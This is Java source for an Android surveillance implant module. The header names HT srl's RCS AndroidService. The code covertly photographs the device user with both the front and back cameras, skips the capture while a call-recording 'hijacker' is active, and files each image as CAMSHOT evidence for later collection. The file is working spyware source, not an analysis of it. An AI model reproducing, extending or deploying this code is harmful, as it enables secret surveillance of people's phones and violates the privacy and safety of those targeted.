/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.module.camera.CameraSnapshot;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

import java.io.IOException;
import java.util.concurrent.Callable;
import java.util.concurrent.TimeUnit;

//MANUAL http://developer.android.com/guide/topics/media/camera.html

/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	int counter = 0;


	//private boolean face;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {

		//boolean force = conf.getBoolean("force", false);
		//face = conf.getBoolean("face", false);

		return Status.self().haveCamera();
	}

	@Override
	public void actualStart() {
		try {
			// todo: Best scenario: module detects when the call is on going which is when a *.bin is present in l4
			// below here the if doesn't work because isRecording is true only after the first .bin has been renamed by hijack in .tmp
			// Actually, the hijack is already recording even before the first .bin has been renamed in .tmp, the usage of the camera can kill
			// mediaserver. Temporary the ModuleCamera checks if the hijacker has been installed, in this case the snapshot is skipped.
			//if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
			if (ModuleCall.self() != null && ModuleCall.self().canRecord()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart), call recording, cannot get snapshot");
				}
				return;
			}

			snapshot();

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}



	/**
	 * Snapshot.
	 *
	 * @throws IOException
	 */
	private void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		counter++;

		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
			final CameraSnapshot camera = CameraSnapshot.self();

			synchronized(Status.self().lockFramebuffer) {
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
			}
			Utils.sleep(100);
			synchronized(Status.self().lockFramebuffer) {
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
			}

		}

	}

	public static void callback(byte[] bs) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback), bs: " + bs.length);
		}
		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
	}

}
